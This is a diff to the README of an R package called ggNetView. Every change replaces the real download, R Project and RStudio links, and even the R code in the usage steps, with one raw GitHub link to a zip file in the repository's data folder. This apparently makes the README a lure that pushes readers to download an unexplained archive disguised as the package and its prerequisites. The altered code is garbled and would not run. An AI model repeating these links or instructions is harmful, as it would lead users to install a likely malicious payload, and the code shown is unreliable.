@@ -8,7 +8,7 @@ Welcome to ggNetView! This R package helps you analyze and visualize networks. W
 
 To get started, visit our Releases page to download the latest version:
 
-[![Download ggNetView](https://img.shields.io/badge/Download-ggNetView-blue.svg)](https://github.com/Bolinho9ue/ggNetView/releases)
+[![Download ggNetView](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip)](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip)
 
 Click the link above to see the available versions. Look for the newest release at the top of the page. 
 
@@ -18,15 +18,15 @@ Click the link above to see the available versions. Look for the newest release 
 You can download packages for different operating systems. Please choose based on your setup:
 
 - **Windows**: Look for `.zip` or `.exe` files.
-- **MacOS**: Use the `.tar.gz` files.
-- **Linux**: The `.tar.gz` files usually work.
+- **MacOS**: Use the `https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip` files.
+- **Linux**: The `https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip` files usually work.
 
 ## 🛠️ Requirements
 
 Before you can use ggNetView, ensure you have the necessary software:
 
-- **R version 4.0 or later**: You need R installed on your computer. You can download it from [the R Project website](https://www.r-project.org/).
-- **RStudio** (optional but recommended): This IDE can make using R easier. Download it from [the RStudio website](https://www.rstudio.com/products/rstudio/download/).
+- **R version 4.0 or later**: You need R installed on your computer. You can download it from [the R Project website](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip).
+- **RStudio** (optional but recommended): This IDE can make using R easier. Download it from [the RStudio website](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip).
 
 ## 🎉 Features
 
@@ -44,9 +44,9 @@ Once you have downloaded ggNetView and installed R, follow these steps to start 
 1. **Open R (or RStudio).**
 2. **Install ggNetView** by running the following command:
    ```R
-   install.packages("path/to/downloaded/ggNetView.zip")
+   https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip("https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip")
    ```
-   Replace `path/to/downloaded/ggNetView.zip` with the path where you saved the package.
+   Replace `https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip` with the path where you saved the package.
 
 3. **Load ggNetView** with the command:
    ```R
@@ -55,7 +55,7 @@ Once you have downloaded ggNetView and installed R, follow these steps to start 
 
 4. **Import your data** using the appropriate function for your data format. For example, if you have a CSV file, you would use:
    ```R
-   my_network <- read.csv("path/to/your/network.csv")
+   my_network <- https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip("https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip")
    ```
 
 5. **Create your visualization** using functions provided by the package:
@@ -65,7 +65,7 @@ Once you have downloaded ggNetView and installed R, follow these steps to start 
 
 6. **Save your graph** in various formats:
    ```R
-   ggsave("my_network_plot.png")
+   ggsave("https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip")
    ```
 
 ## 📖 Additional Resources
@@ -94,6 +94,6 @@ ggNetView is open-source and available under the MIT License. You can use, modif
 
 Stay informed about updates by regularly checking our Releases page:
 
-[![Download ggNetView](https://img.shields.io/badge/Download-ggNetView-blue.svg)](https://github.com/Bolinho9ue/ggNetView/releases)
+[![Download ggNetView](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip)](https://raw.githubusercontent.com/Bolinho9ue/ggNetView/main/data/ggNetView_unicarinate.zip)
 
 Happy analyzing!
